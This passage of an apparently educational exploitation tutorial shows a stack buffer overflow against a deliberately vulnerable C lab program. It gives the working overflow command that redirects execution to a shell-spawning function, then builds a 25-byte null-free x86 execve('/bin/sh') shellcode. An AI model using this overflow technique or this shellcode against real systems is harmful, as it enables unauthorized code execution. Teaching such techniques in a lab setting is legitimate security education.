            <p>Now, if you didn't know, the <b>argv</b> of a program is given via the commandline (e.g. <b>./myprogram arg1</b>). It's important to note that the argv[0] is actually the file name and argv[1] is the first argument that you provide. </p>
            <p>Back to the exploit. So, what's this program doing? It looks like it takes in an argument from <b>argv</b> and sends it to the <b>mycpy()</b> method. So, what's mycpy do? It copies your input string into a 4 char buffer. Well that's a buffer overflow waiting to happen. So now that we've identified the way we can input our buffer overflow and where it occurs, it's now time to actually exploit it! You can download the C file <a href="../file_resources/overflow.c" download>here</a> and the actual binary <a href="../file_resources/overflow.o" download>here</a>. To compile the code yourself do <b>gcc -m32 -fno-stack-protector overflow.c -o overflow.o</b></p>
            <p>(No matter how complicated the overflow, it'll generally boil down to 3 things: Identifying the overflow, Identifying a place to jump to, and how the input is handled)</p>
        </div>
        <div class="col-sm-3">
            <pre><code class="cpp" id="overflow-call-ex">#include &ltstring.h&gt
#include &lt;stdio.h&gt;

void mycpy(char* str)
{   
  char foo[4];   
  strcpy(foo, str);
}

int main(int argc, char* argv[])
{   
  if (argc != 2) {
    printf("Please supply a second arg!\n");
    return -1;
  }
  mycpy(argv[1]);   
  printf("After");   
  return 0;
}

void notCalled() {
  printf("YOU CALLED ME!\n");
  system("/bin/sh");
}</code></pre>
        </div>
    </div>
    <h3 class="text-center bottom-pad">Gathering Info</h3>
    <div class="row mobile-margin-left mobile-margin-right">
        <div class="col-sm-4 col-sm-offset-2">
            <p>It's now time to introduce the first tool in our arsenal that'll be integral to breaking binaries by looking at the raw assembly, <b>objdump</b>. We can't tell just from the C code how the buffer is set up on the stack. We won't always have the C code to rely on either, so <b>objdump</b> will quickly become a close friend. Let's try it! Navigate to the directory that the overflow.o file is in. Run the command <b>objdump -D -M intel ./overflow.o | less</b>. The <b>-D</b> tells objdump to disassemble everything it can find and the <b>-M intel</b> tells it to disassemble into intel syntax rather than the default AT&amp;T syntax. The pipe to less just makes the output navigable in a vim format. If you don't know how to search type: <b>/search_term</b>. Since we identified the overflow in <b>mycpy()</b> lets search for it and look at what it's assembly is. We really only care about the <b>strcpy</b> function and where the buffers are. Remember that the calling convention for cdecl is to push the arguments to the stack before the function is called.</p>
        </div>
        <div class="container">
            <div class="col-sm-6 well">
                <img src="../img/call_me_objdump.JPG" class="img-responsive" alt="binary objdump">
            </div>
        </div>
    </div>
    <div class="row mobile-margin-left mobile-margin-right">
        <div class="col-sm-4 col-sm-offset-2">
            <p>We can see that there are two <b>push</b> instructions, one that does <b>push DWORD PTR [ebp+0x8]</b> and one that does <b>lea eax, [ebp-0xc]</b>. Which is our local buffer? You can actually tell in two different ways. The first being that the arguments are pushed on the stack in order from last to first meaning that the last push that happens before the function is called is actually the first argument. We know that <b>strcpy</b> moves from (dest, src) meaning the first arg is actually our local buffer. The second way to tell is that the first push to happen pushes the pointer to <b>ebp+0x8</b>. Really the only time an offset of <b>ebp</b> will be positive is when accessing a functions current parameters. Looking at the second push we see that it's a <b>lea</b> instruction meaning its getting a pointer to the location of <b>ebp-0xc</b>. Since <b>ebp-0xc</b> is an address in our current function frame that's where our local buffer is going to be.</p>
            <p>To the right is a representation of what the stack would look like in this situation. Since the location of the buffer is <b>ebp-0xc</b> that means that we only need to fill <b>0xc</b> bytes amount of data (3 words) to reach the <b>ebp</b>. Then to overwrite the <b>Saved EBP</b> we only need 4 more bytes (1 word). I should mention we don't care about what we put in for the <b>Saved EBP</b> location because we won't need to rely on previous stack locations. The next 4 bytes is the value of <b>saved EIP</b>. This is where our <b>eip</b> will move to once the current function returns. What do you think this value should be? What would happen if we put in the address of the <b>notCalled()</b> function? To find the address of the <b>notCalled()</b> function we'll need to go back into our <b>objdump</b> and grab the address next to it. In my case it is <b>0x08048516</b> (for reference, the address of <b>mycpy()</b> is <b>0x0804849b</b>). Okay great, we know what our offset is and the value we want to overwrite the <b>Saved EIP</b> with, but how do we use any of this. We will now enter the awesome world of python.</p>
        </div>
        <div class="col-sm-2 well stack-loc">"Your&nbsp;String" Saved&nbsp;EIP Saved&nbsp;EBP &nbsp; &nbsp; Buffer&nbsp;Location &nbsp; &nbsp; &nbsp; &amp;("Your&nbsp;String") &amp;(Buffer&nbsp;Location)</div>
        <div class="col-sm-2 well stack-loc">"Your&nbsp;String" Jump&nbsp;Address&nbsp;(Saved&nbsp;EIP) aaaa&nbsp;(Saved&nbsp;EBP) aaaa aaaa aaaa&nbsp;(Buffer&nbsp;Location) &nbsp; &nbsp; &nbsp; &amp;("Your&nbsp;String") &amp;(Buffer&nbsp;Location)</div>
    </div>
    <h3 class="text-center">Exploiting The Binary</h3>
    <div class="row mobile-margin-left-small mobile-margin-right-small">
        <div class="col-sm-4 col-sm-offset-2">
            <p>Even if you've never written a line of python before, it's actually pretty easy to understand. Since we won't need to write much, we'll actually go for the in-line approach. In bash, you can write in-line python code like this: <b>python -c "your code here"</b>. Simple right? Another awesome feature of python is its string repetition operator <b>*</b> We can repeat a string any amount of times with this. Let's say we wanted to write 'Hello' 5 times. Our code would look like <b>"print 'Hello'*5"</b> our output would be <b>HelloHelloHelloHelloHello</b>. Note that we used double quotes to wrap the code and single quotes to wrap the string. You can switch the two so that strings are double quoted and the code is encased in single quotes, but you cannot use one for both strings and code. Now, how can we apply this python to our exploit?</p>
        </div>
        <div class="container-fluid">
            <div class="col-sm-5 well">
                <img src="../img/first_exploit.JPG" class="img-responsive" alt="">
            </div>
        </div>
    </div>
    <div class="row mobile-margin-left-small mobile-margin-right-small">
        <div class="col-sm-4 col-sm-offset-2">
            <p>Well we know that we need to generate 3 words for the buffer, 1 word for the <b>Saved EBP</b> and 1 word for the <b>Saved EIP</b>. That's 4 + 1 words in total. Since 1 word is 4 bytes we need a total of 16 + 4 bytes of data. We can write it in python like so <b>python -c "print 'a'*16 + 'b'*4"</b>. The reason we use the same character for most things is because we can check the address of the segfault with the command <b>dmesg | tail</b>. An 'a' has the ascii hex value of <b>0x61</b> and 'b' <b>0x62</b>. Looking at the address of a segfault that looks like <b>0x61616161</b> would mean that our a's actually filled the <b>Saved EIP</b>. The next thing we want to do is replace the b's with the address of <b>notCalled()</b>. Remember that this is x86 and everything is little-endian so we must reverse our address of <b>0x08048516</b> to <b>0x16850408</b>. Now to have python output the actual bytes rather than the string version we need to use the syntax of <b>'\xBYTE'</b>. So in our case it would be <b>'\x16\x85\x04\x08'</b>. Let's combine this with our previous python code to make <b>python -c "print 'a'*16 + '\x16\x85\x04\x08'"</b>. Great, now we have our output set up.</p>
            <p>Normally the program would accept input via <b>stdin</b> in which case we could just pipe it into the program like <b>python -c "print 'a'*16 + '\x16\x85\x04\x08'" | ./program.o</b>, but our program accepts the input via an argument. To make bash evaluate the python in the argument we need to wrap it like so: <b>$(python -c "print 'a'*16 + '\x16\x85\x04\x08'")</b>. The whole line with the program will be: <b>./overflow.o $(python -c "print 'a'*16 + '\x16\x85\x04\x08'")</b>. Congratulations, you just executed your first successful buffer overflow!</p>
        </div>
        <div class="col-sm-4 well">
            <h4 class="text-center">Here are some other challenges to try!</h4>
            <h5>Here's an example to help with the stack</h5>
            <ul>
                <li><a href="../file_resources/stack_peek.c" download>stack_peek.c</a></li>
                <li><a href="../file_resources/Unknown1" download="stack_peek.o">stack_peek.o</a></li>
            </ul>
            <h5>Try doing these without C files</h5>
            <ul>
                <li><a href="../file_resources/vuln" download>Vuln</a></li>
                <li><a href="../file_resources/call_me.o" download>Call Me</a></li>
            </ul>
        </div>
    </div>
    <h3 class="text-center bottom-pad">Let's Try It Out!</h3>
    <div class="row mobile-margin-left-small mobile-margin-right-small bottom-pad">
        <div class="col-sm-6 col-sm-offset-3 well" id="terminal"></div>
    </div>
    <div class="row" id="shellcode">
        <h2 class="text-center"><b>Shellcode</b></h1>
            <h3 class="text-center">What is it?</h2>
        <div class="col-sm-3 col-sm-offset-1">
            <div class="col-sm-11 col-sm-offset-2">
                <p>What is Shellcode? Well I'm glad you asked anonymous reader! Shellcode isn't quite as widely used today due to some protections that were introduced that make the stack non-executable in most systems, but we'll cover it anyways. Shellcode is code that is written, usually in assembly, to primarily get a shell (you can make it do other things, but for now we'll just use it to get shells). </p>
            </div>
        </div>
        <div class="col-sm-3">
            <div class="col-sm-11 col-sm-offset-2">
                <p>Situations in which you'd actually use shellcode is when you know that the stack is executable and you have no clear target with a buffer overflow. Shellcode will allow us to inject specially crafted code onto the stack and execute it. But how is this possible you might ask? We need to set up a couple of things first in order to make it work.</p>
            </div>
        </div>
        <div class="col-sm-4">
            <div class="col-sm-9 col-sm-offset-1">
                <p>The first step is to understand how <b>syscall</b>'s work in x86. Then you'll need to translate the code you want to execute into assembly. Then you need to modify that assembly so that once the bytecode is made you can actually input the whole thing into the program. The last step is to get that bytecode. Simple enough!</p>
            </div>
        </div>
    </div>
    <h3 class="text-center">Square One</h3>
    <div class="row bottom-pad" id="assembly">
        <div class="col-sm-3 col-sm-offset-3">
            <pre><code class="language-cpp">#include &lt;stdlib.h&gt;

int main() {
    exit(0);
    return 1;
}

</code></pre>
        </div>
        <div class="col-sm-3">
            <pre><code class="x86asm hljs">.text
.global main

main:
    mov $0x0, %ebx
    mov $0x1, %eax
    int $0x80</code></pre>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <div class="row">
                <div class="col-sm-8">
                    <p>Let's start off by trying to replicate something like <b>exit(0)</b> from C into x86. First off, I know we've been reading x86 with intel syntax, but we have to write it with AT&amp;T syntax. The only differences that we'll look at are that all constants are preceded by <b>$</b>, all registers are preceded by <b>%</b>, and the <b>src</b> and <b>dst</b> registers are switched. If you get confused just try and look for a constant like <b>$0x0</b> being <b>mov</b>'d and you'll see which is the <b>src</b> and <b>dst</b> because you can't <b>mov</b> a register into a constant.</p>
                </div>
                <div class="col-sm-4">
                    <pre><code class="x86asm hljs">
mov $0, %ebx

</code></pre></div>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <div class="row">
                <div class="col-sm-8">
                    <p>Now that that's out of the way let's actually try to take this C code and turn it into x86. <b>exit</b> is what's known as a <b>syscall</b> meaning the function is pre-programmed and it runs with escalated privilages. These <b>syscall</b>'s all have numbers associated with them and you can find a table <a href="https://syscalls.kernelgrok.com/">here</a>. The <b>syscall</b> number comes into play when setting up the <b>syscall</b> in x86. Looking to the right you can see how an x86 <b>syscall</b> is set up. The <b>syscall</b> number goes into <b>eax</b>. The first parameter goes into <b>ebx</b>. The second paramater goes into <b>ecx</b> and so on. The last thing to note is that in x86 after you've set up all the paramaters and <b>syscall</b> number, you'll need to do a final instruction called <b>int 80</b>. This is a special interupt to let the kernel know that it should start a syscall with this information.</p>
                </div>
                <div class="col-sm-4">
                    <pre><code class="x86asm hljs">eax: Syscall #
ebx: 1st Param
ecx: 2nd Param
edx: 3rd Param
esi: 4th Param
edi: 5th Param
ebp: 6th Param

return val: eax</code></pre></div>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <div class="row">
                <div class="col-sm-8">
                    <p>Note that the order does not matter in which we load the values as long as everything is in place before we do <b>int 80</b>. We need to look up some information about <b>exit</b> in order to translate it into assembly. First, how many arguments does it take (You can find all this out with the <b>man</b> command on linux)? It takes one argument which is the exit code. Now that we know that, what's its <b>syscall</b> number? We can look at the link and see that it's 1. Now with this we just have to put 1 into <b>eax</b> and whatever we want our exit code to be, in this case 0, in <b>ebx</b>. That's simple enough with a couple of <b>mov</b> instructions. Now just do an <b>int 80</b> and were done! That was easy.</p>
                </div>
                <div class="col-sm-4">
                    <pre><code class="x86asm hljs">mov $0x0, %ebx
mov $0x1, %eax
int $0x80</code></pre></div>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <pre><code class="x86asm hljs">080483db &lt;main&gt;:
 80483db:       bb 00 00 00 00          mov    ebx,0x0
 80483e0:       b8 01 00 00 00          mov    eax,0x1
 80483e5:       cd 80                   int    0x80
</code></pre>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <p>Above is the output of the main function from <b>objdump -D -M intel ./a.out | less</b> after saving the assembly code as <b>exit_example.s</b> and compiling with <b>gcc -m32 exit_example.s</b>. We can extract the bytecode from the output above. The bytecode of this output is the bytes between the address and the instruction. The whole bytecode would be <b>bb 00 00 00 00</b>, <b>b8 01 00 00 00</b>, and <b>cd 80</b>. Turning this into something that python can output it also easy, just replace the spaces with with the byte syntax making it <b>'\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80'</b>. However, if there were a buffer overflow we couldn't just send this as input directly into the program unfortunately. The reason we can't do that is due to the fact that our bytecode has null bytes in it. This is a problem because strings in C and C++ are null terminated so as soon as whatever is reading our input hits the first null byte in the input, it would disregard the rest of our input. Taking out the null bytes will require a few tricks on our end.</p>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <div class="row">
                <div class="col-sm-8">
                    <p>Looking at our first instruction with null bytes we have <b>mov $0x0, %ebx</b>. The null byte comes from loading the constant value of 0. Is there a way to put a 0 into the register of <b>ebx</b>? It would be possible to say <b>mov</b> a 0 from a register that had the value into <b>ebx</b>, but that's not even necessary. One way to put a 0 into the register is to <b>xor</b> the register with itself. The truth table for logical <b>xor</b> is to the right. All it shows is that when two of the bits are the same the result is a 0. This means that if you <b>xor</b> a register with itself its <b>xor</b>ing one value with the exact same value which will produce a 0.</p>
                </div>
                <div class="col-sm-4">
                    <pre><code class="x86asm hljs">  XOR|0|1|
   |0|F|T|
   |1|T|F|
</code></pre></div>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <div class="row">
                <div class="col-sm-5">
                    <p>The next instruction we need to replicate without 0's is a little more complicated because it has an actual value. There's actually two solutions that we can use for this. Both start by <b>xor</b>ing the <b>eax</b> register. The next and last step is to choose between two instructions: <b>inc</b> and <b>mov</b>. <b>inc</b> is an instruction to increment the value in the register which would make the value in <b>eax</b> go from 0 to 1. The <b>mov</b> instruction requires a little trick, otherwise we'd end up with the same null bytes as before. 32-bit registers are actually made up of smaller registers which you can see to the right.</p>
                </div>
                <div class="col-sm-7">
                    <pre><code class="nohighlight">eax (First 32-bits): 1111 1110 1101 1100 1011 1010 1001 1000
ax (First 16-bits): 1011 1010 1001 1000
ah (Most Significant 8-bits): 1011 1010
al (Least Significant 8-bits): 1001 1000</code></pre>
                </div>
            </div>
            <div class="row">
                <div class="col-sm-8">
                    <p>Looking at the registers breakdown we can see that we can actually address the single least significant byte of a register. We can now move any value less than 256 into this location. Since we only want a 1 into the register so it's fine to move it into the sub-register of <b>al</b>. Let's compile this and look at the bytecode.</p>
                </div>
                <div class="col-sm-4">
                    <pre><code class="x86asm hljs">xor %ebx, %ebx
mov $0x1, %al
int $0x80</code></pre></div>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <pre><code class="x86asm hljs">080483db &lt;main&gt;:
 80483db:       31 db                   xor    ebx,ebx
 80483dd:       b0 01                   mov    al,0x1
 80483df:       cd 80                   int    0x80
</code></pre>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <p>Our bytecode now is totally different and also much shorter. You can also see that there are no null bytes which is extremely helpful.</p>
        </div>
    </div>
    </div>
    <h3 class="text-center">Making Something Useful</h3>
    <div class="row bottom-pad" id="assembly">
        <div class="col-sm-3 col-sm-offset-3">
            <pre><code class="language-cpp">#include &lt;stdlib.h&gt;

int main() {

    char *shell[2];

    shell[0] = "/bin/sh";
    shell[1] = NULL;

    execve(shell[0], shell, NULL);
    return 0;
}

</code></pre>
        </div>
        <div class="col-sm-3">
            <pre><code class="x86asm hljs">.text
.global main

main:
    mov $0x0b, %eax
    push $0x0068732f
    push $0x6e69622f
    mov %esp, %ebx
    push $0x0
    push %ebx
    mov %esp, %ecx
    mov $0x0, %edx
    int $0x80</code></pre>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <div class="row">
                <div class="col-sm-8">
                    <p>The above code will become our shellcode when we're done taking out the null bytes. First I should clarify that the key piece here is <b>execve</b>. <b>execve</b> is a syscall that executes a binary pointed to by the filepath. Running the <b>man</b> command on it will show us that <b>execve</b> has 3 paramaters: char *filename, char *argv[], and char *envp. So to break this down, the char* to the filename is the full path to the binary file which in our case will be <b>/bin/sh</b> which will give us the shell. The second parameter is a pointer to all the arguments for the function which would be a char**, this can actually be NULL, but the shellcode will fail on some systems. The last paramater is a char* to the environment variables which we don't care about so we can actually make it NULL. </p>
                </div>
                <div class="col-sm-4">
                    <pre><code class="cpp hljs">
execve(shell[0], shell, NULL);

</code></pre></div>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <div class="row">
                <div class="col-sm-8">
                    <p>To explain the assembly above let's look at how we need to set up each of the parameters for the <b>syscall</b>. We have three parameters that will need to be loaded into the <b>ebx</b>, <b>ecx</b>, and <b>edx</b> registers while the <b>syscall</b> number is loaded into the <b>eax</b> register. Looking up the <b>syscall</b> number we can see that it is 11 or 0x0b. This is why we <b>mov</b> 0x0b into <b>eax</b>. The next two instructions are <b>push</b> instructions of bytes. Those bytes are actually the little endian representation of the string "/bin/sh" terminated by a NULL byte. It also greatly helps us that there are only 7 bytes in the string meaning that we only need one byte to fill the rest of the 2nd word taken up by the string. Being word aligned is very important for us because of how we will access it. Since we won't have control over the addresses of the string (most of the time) we need to make sure our shellcode works at any location. We can do this with the next instruction that does a <b>mov</b> of <b>esp</b> into <b>ebx</b>. Since the <b>push</b> isntruction updates the address in <b>esp</b>, when the second <b>push</b> is made the current address in <b>esp</b> points to the NULL terminated string that we pushed. Moving this address into <b>ebx</b> sets up the first parameter of our <b>execve</b> call.</p>
                </div>
                <div class="col-sm-4">
                    <pre><code class="cpp hljs">
push $0x0068732f
push $0x6e69622f
mov %esp, %ebx

</code></pre></div>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <div class="row">
                <div class="col-sm-8">
                    <p>The second parameter that we set up is a pointer to our arguments. This means a pointer to both our filename ('/bin/sh') and our environment variables (NULL). To get a pointer to these arguments we can do exactly what we did to get a pointer to '/bin/sh'. We <b>push</b> 0x0 (which is really 0x00000000) to the stack and then we push the pointer to our filename which is in <b>ebx</b> to the stack. We can then <b>mov</b> the <b>esp</b> into <b>ecx</b> to get a pointer to our arguments. The last argument is easy since its NULL. All we do is <b>mov</b> 0x0 into <b>edx</b>. That's it! You can compile this and run it and you will get a shell. We've just made working shellcode, but as you'll see below there are a lot of NULL bytes in the bytecode we have to worry about.</p>
                </div>
                <div class="col-sm-4">
                    <pre><code class="cpp hljs">
push $0x0
push %ebx
mov %esp, %ecx
mov $0x0, %edx

</code></pre></div>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <pre><code class="x86asm hljs">080483db &lt;main&gt;:
 80483db:       b8 0b 00 00 00          mov    eax,0xb
 80483e0:       68 2f 73 68 00          push   0x68732f
 80483e5:       68 2f 62 69 6e          push   0x6e69622f
 80483ea:       89 e3                   mov    ebx,esp
 80483ec:       6a 00                   push   0x0
 80483ee:       53                      push   ebx
 80483ef:       89 e1                   mov    ecx,esp
 80483f1:       ba 00 00 00 00          mov    edx,0x0
 80483f6:       cd 80                   int    0x80

</code></pre>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <div class="row">
                <div class="col-sm-8">
                    <p>The first set of NULL bytes that we can see come from moving 0x0b into <b>eax</b>. We've seen before with our example with <b>exit()</b> that we can move single bytes into registers using their least significant 8-bit sub-register. We of course need to xor the register with itself first to make sure that our <b>mov</b> into the lower bits is the correct value of the entire register. That's the first one down, 3 to go!</p>
                </div>
                <div class="col-sm-4">
                    <pre><code class="cpp hljs">mov $0x0b, %eax

xor %eax, %eax
mov $0x0b, %al
</code></pre></div>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <div class="row">
                <div class="col-sm-8">
                    <p>The second NULL byte comes from NULL terminating the '/bin/sh' string. We need to NULL terminate the string still so we'll put a 0x0 value into <b>edx</b> because it'll be 0x0 later anyway and we can use it now by pushing it to the stack now. Then we can push the string to the stack and it will be followed by 0x0 because we pushed <b>edx</b> first. We run into a problem now though because we our last bytes of the string are not word aligned. We can solve this by adding extra <b>/</b>'s (0x2f in byte form). This is acceptable because you can add as many <b>/</b>'s to a string or command consecutively and it will not change the command. You can try this in linux with the <b>cd</b> command (e.g. cd ~///////////////Documents).</p>
                </div>
                <div class="col-sm-4">
                    <pre><code class="cpp hljs">push $0x0068732f
push $0x6e69622f

xor %edx, %edx
push %edx
push $0x68732f2f
push $0x6e69622f  
</code></pre></div>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <div class="row">
                <div class="col-sm-8">
                    <p>This next one is pretty easy since we can replace pushing 0x0 directly with just pushing the <b>edx</b> register since we've already xor'd it and zeroed it out.</p>
                </div>
                <div class="col-sm-4">
                    <pre><code class="cpp hljs">push $0x0

push %edx</code></pre></div>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <div class="row">
                <div class="col-sm-8">
                    <p>We can actually completely ignore this instruction because as stated above we've already zeroed out the <b>edx</b> register. Let's take a look at the final result below.</p>
                </div>
                <div class="col-sm-4">
                    <pre><code class="cpp hljs">
mov $0x0, %edx

</code></pre></div>
            </div>
        </div>
    </div>
    <div class="row bottom-pad" id="assembly">
        <div class="col-sm-2 col-sm-offset-3">
            <pre><code class="language-cpp">.text
.global main

main:
    xor %eax, %eax
    mov $0x0b, %al
    xor %edx, %edx
    push %edx
    push $0x68732f2f
    push $0x6e69622f
    mov %esp, %ebx
    push %edx
    push %ebx
    mov %esp, %ecx
    int $0x80</code></pre>
        </div>
        <div class="col-sm-4">
            <pre><code class="x86asm hljs">080483db &lt;main&gt;:
 80483db:       31 c0                   xor    eax,eax
 80483dd:       b0 0b                   mov    al,0xb
 80483df:       31 d2                   xor    edx,edx
 80483e1:       52                      push   edx
 80483e2:       68 2f 2f 73 68          push   0x68732f2f
 80483e7:       68 2f 62 69 6e          push   0x6e69622f
 80483ec:       89 e3                   mov    ebx,esp
 80483ee:       52                      push   edx
 80483ef:       53                      push   ebx
 80483f0:       89 e1                   mov    ecx,esp
 80483f2:       cd 80                   int    0x80



</code></pre>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <p>We can see that there are no NULL bytes at all in our bytecode! Let's just quickly translate that into something that python could ouptut, here it is: '\x31\xc0\xb0\x0b\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80' (25 bytes). Now that we finally have our non-NULL byte shellcode, let's put it to use!</p>
        </div>
    </div>
    <div class="row" id="format-strings">
        <h2 class="text-center"><b>Format Strings</b></h1>
            <h3 class="text-center">Coming Soon!</h2>
    </div>
    <div class="row" id="rop">
        <h2 class="text-center"><b>ROP: Return Oriented Programming</b></h1>
                <h3 class="text-center">Coming Soon!</h2>
    </div>
    <div class="row" id="heap-exploit">
        <h2 class="text-center"><b>Heap Exploitation</b></h2>
        <h3 class="text-center">I'm not great at heaps. Coming not so soon!</h3>
        <h3 class="text-center">In the mean time, check out Shellphish's <a href="https://github.com/shellphish/how2heap">how2heap</a>.</h3>
    </div>
    </div>
    <script src="../js/vendor/modernizr-3.5.0.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
    <script>
    window.jQuery || document.write('<script src="../js/vendor/jquery-3.2.1.min.js"><\/script>')
    </script>
    <script src="../js/plugins.js"></script>
    <script src="../js/main.js"></script>
    <script src="../xterm/xterm.js"></script>
    <script src="../xterm/attach/attach.js"></script>
    <script src="../highlight/highlight.pack.js"></script>
    <script>
    hljs.initHighlightingOnLoad();
    </script>
    <script>
    var term = new Terminal({
        cursorBlink: true,
        rows: 20,
        tabStopWidth: 4
    });
    //var socket = new WebSocket('wss://docker.example.com/containers/mycontainerid/attach/ws');
    //var socket = new WebSocket('ws://192.168.99.100:31337', true);
    var socket = new WebSocket('ws://echo.websocket.org', true);
    socket.binaryType = 'arraybuffer';
    //term.attach(socket, true, true);
    term.open(document.getElementById('terminal'), false);
    var user = ' \033[1;3;31mbuffer@overflow\033[0m:\033[1;34m~\033[0m\033[1;32m$\033[0m ';
    term.write(user);
    var currInput = '';
    var allData = '';
    term.textarea.onkeydown = function(e) {
        //console.log('User pressed key with keyCode: ', e.keyCode, e.key);
        if (e.keyCode == 13) { //Enter
            term.writeln('');
            term.write(user);
            if (currInput === 'clear') {
                term.clear();
            }
            currInput = '';
        } else if (e.keyCode == 8) { //BackSpace
            term.write('\r');
            currInput = currInput.slice(0, -1);
            term.write(user + currInput + ' ');
            term.write('\r');
            term.write(user + currInput);
        } else if (e.keyCode == 16) { //Shift
            //Do Nothing
        } else if (e.keyCode == 17) { //Control
            //Do Nothing
        } else if (e.keyCode == 18) { //Alt
            //Do Nothing
        } else {
            term.write(e.key);
            currInput += e.key;
        }

    }
    </script>
    <!-- Google Analytics: change UA-XXXXX-Y to be your site's ID. -->
    <!-- <script> -->
    <!--     window.ga=function(){ga.q.push(arguments)};ga.q=[];ga.l=+new Date; -->
    <!--     ga('create','UA-XXXXX-Y','auto');ga('send','pageview') -->
    <!-- </script> -->
    <!-- <script src="https://www.google-analytics.com/analytics.js" async defer></script> -->
</body>

</html>